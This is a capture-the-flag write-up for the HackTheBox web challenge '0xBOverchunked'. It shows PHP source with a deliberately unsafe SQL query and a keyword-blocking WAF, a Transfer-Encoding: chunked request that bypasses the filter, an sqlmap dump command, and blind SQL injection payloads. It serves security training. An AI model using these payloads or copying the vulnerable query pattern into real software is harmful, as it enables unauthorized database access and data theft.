---
title: HackTheBox | 0xBOverchunked
categories: [CTF]
tags: [CTF, HackTheBox, HTB, Challenge, PHP, SQL]
image:
  path: /assets/img/0xBOverchunked/main.webp
---

### CATEGORY: Web

### Difficulty: Easy

### Challenge Description: Are you able to retrieve the 6th character from the database?

You can download the task source code from here → [HackTheBox Challenge](https://app.hackthebox.com/challenges/0xBOverchunked)

### App Structure:

```terminal
.
├── 0xBOverchunked.zip
├── build_docker.sh
├── challenge
│   ├── assets
│   │   ├── images
│   │   │   ├── bg.png
│   │   │   ├── game-boy8bit.png
│   │   │   └── posts
│   │   │       ├── 1.png
│   │   │       ├── 2.png
│   │   │       ├── 3.png
│   │   │       ├── 4.png
│   │   │       └── 5.png
│   │   └── styles
│   │       └── style.css
│   ├── Controllers
│   │   ├── Database
│   │   │   ├── Connect.php
│   │   │   └── Cursor.php
│   │   ├── Handlers
│   │   │   └── SearchHandler.php
│   │   └── WAF
│   │       └── waf.php
│   ├── db
│   │   └── init.sql
│   └── index.php
├── conf
│   ├── httpd.conf
│   └── supervisord.conf
└── Dockerfile

12 directories, 19 files
```

After downloading the source code and unzipping it, let’s analyze it.

![Challenge Homepage](/assets/img/0xBOverchunked/main.webp)

Searching by ID seems to be an interesting functionality.

Play around with the search bar to understand how it works, then test it for vulnerabilities.

While navigating through the files, if you look at `Cursor.php`, you’ll see two functions: `unsafequery` and `safequery`. The `unsafequery` function takes `$pdo` and `$id` as arguments and executes them inside an SQL query without a prepared statement. However, the `safequery` function takes the same parameters and executes them using a prepared statement.

**Note:** If you don’t know what a prepared statement is, you can read about it here → [Prepared Statements](https://www.w3schools.com/php/php_mysql_prepared_statements.asp)

```php
<?php
require_once 'Connect.php';

function safequery($pdo, $id)
{
    if ($id == 6)
    {
        die("You are not allowed to view this post!");
    }

    $stmt = $pdo->prepare("SELECT id, gamename, gamedesc, image FROM posts  WHERE id = ?");
    $stmt->execute([$id]);

    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    return $result;
}

function unsafequery($pdo, $id)
{
    try
    {
        $stmt = $pdo->query("SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'");
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result;
    }
    catch(Exception $e)
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }
}

?>
```

If you try to inject some SQL, you’ll get this message:

![WAF_Message](/assets/img/0xBOverchunked/waf.webp)

It seems like a WAF is being used (actually, you already know this from the `waf.php` file :D).

Let’s navigate through `waf.php`.

```php
<?php
function waf_sql_injection($input)
{
    $sql_keywords = array(
        'SELECT',
        'INSERT',
        'UPDATE',
        'DELETE',
        'UNION',
        'DROP',
        'TRUNCATE',
        'ALTER',
        'CREATE',
        'FROM',
        'WHERE',
        'GROUP BY',
        'HAVING',
        'ORDER BY',
        'LIMIT',
        'OFFSET',
        'JOIN',
        'ON',
        'SET',
        'VALUES',
        'INDEX',
        'KEY',
        'PRIMARY',
        'FOREIGN',
        'REFERENCES',
        'TABLE',
        'VIEW',
        'AND',
        'OR',
        "'",
        '"',
        "')",
        '-- -',
        '#',
        '--',
        '-'
    );

    foreach ($sql_keywords as $keyword)
    {
        if (stripos($input, $keyword) !== false)
        {
            return false;
        }
    }
    return true;
}

?>
```

The `foreach` loop searches for SQL keywords in the search input and sanitizes it.

It looks like a very restrictive WAF.

But how can we bypass this WAF and reach the `unsafequery` function?

While analyzing `SearchHandler.php`, we’ll see this `if` statement:

```php
if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
{
    $search = $_POST['search'];

    $result = unsafequery($pdo, $search);

    if ($result)
    {
        echo "<div class='results'>No post id found.</div>";
    }
    else
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }

}
```

This statement checks for the `Transfer-Encoding` header with the value `chunked` (it has nothing to do with HTTP Request Smuggling).

If we include the `Transfer-Encoding: chunked` header in our request, we’ll reach the `unsafequery` function and inject some SQL.

### Let’s Get the Flag

Request used:

```
POST /Controllers/Handlers/SearchHandler.php HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 8
Origin: http://host/
Connection: close
Referer: http://host/
Transfer-Encoding: chunked

search=1
```

Then run `sqlmap` on that request:

```terminal
sqlmap -r request --risk=3 --level=5 --dbms=sqlite --ignore-code=500 --dump -T posts --threads 10
```

`sqlmap` will detect a blind SQL injection:

```terminal
sqlmap resumed the following injection point(s) from stored session:

Parameter: search (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=1' AND 1602=1602-- tNrW

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: search=1' AND 9040=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- xaaq

web application technology: Apache
back-end DBMS: SQLite
```

After a few minutes, you’ll get the flag.

### Congratulations!
